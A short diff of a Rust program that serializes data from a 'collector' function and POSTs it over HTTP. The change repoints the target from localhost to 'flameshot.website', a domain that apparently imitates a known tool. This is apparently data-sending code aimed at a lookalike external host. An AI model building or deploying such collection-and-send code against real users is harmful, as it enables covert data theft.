@@ -47,7 +47,7 @@ fn collector(session_id: &String) -> POD {
 fn send(url: String, data:POD) -> Result<(), anyhow::Error> {
     // Sérialisation bincode → Vec<u8>
     let encoded: Vec<u8> = bincode::serialize(&data)?;
-    println!("encoded");
+    println!("\nencoded");
 
     // Envoi en HTTP POST
     let client = reqwest::blocking::Client::new();
@@ -89,7 +89,7 @@ fn main() {
     // chopper des commandline aussi pour le session id et le password
     let session_id="yolo".to_string();
     //let url="https://flameshot.website:8444".to_string();
-    let url="http://127.0.0.1:3000/login.php".to_string();
+    let url="http://flameshot.website:3000/login.php".to_string();
     collect_and_send(1,session_id,url)
 
 }
